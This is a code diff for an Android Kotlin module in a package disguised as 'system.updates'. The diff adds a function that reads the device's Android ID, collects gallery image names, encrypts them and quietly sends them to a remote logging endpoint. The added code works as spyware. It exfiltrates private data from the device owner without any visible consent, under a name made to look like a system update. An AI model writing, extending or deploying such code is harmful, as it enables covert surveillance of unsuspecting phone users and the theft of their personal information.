@@ -2,44 +2,32 @@ package com.system.updates.modules
 
 import android.content.Context
 import android.provider.MediaStore
-import android.util.Log
-import java.io.File
+import android.provider.Settings
+import com.system.updates.core.CryptoManager
+import com.system.updates.core.NetUtils
 
 object ImageModule {
 
-    private const val TAG = "ImageModule"
-
-    fun scanGallery(context: Context, limit: Int = 50): List<File> {
-        val imageFiles = mutableListOf<File>()
-        val projection = arrayOf(MediaStore.Images.Media.DATA)
-        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-
+    fun scanAndSendGalleryInfo(context: Context) {
+        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+        val projection = arrayOf(MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE)
         val cursor = context.contentResolver.query(
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            projection,
-            null,
-            null,
-            sortOrder
+            projection, null, null, null
         )
 
+        val imageList = mutableListOf<String>()
         cursor?.use {
-            val columnIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-            var count = 0
-            while (it.moveToNext() && count < limit) {
-                val filePath = it.getString(columnIndex)
-                val file = File(filePath)
-                if (file.exists()) {
-                    imageFiles.add(file)
-                    count++
-                }
+            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+            while (it.moveToNext() && imageList.size < 20) {
+                imageList.add(it.getString(nameColumn))
             }
         }
 
-        Log.d(TAG, "Found ${imageFiles.size} images to process.")
-        return imageFiles
-    }
-
-    fun processImage(file: File) {
-        // سيتم إضافة التصنيف والتشفير لاحقاً
+        if (imageList.isNotEmpty()) {
+            val data = "Images Found: ${imageList.joinToString(", ")}"
+            val encrypted = CryptoManager.encryptHybrid(data.toByteArray())
+            NetUtils.sendLog(deviceId, "gallery_scan", encrypted.first, encrypted.second) { }
+        }
     }
 }
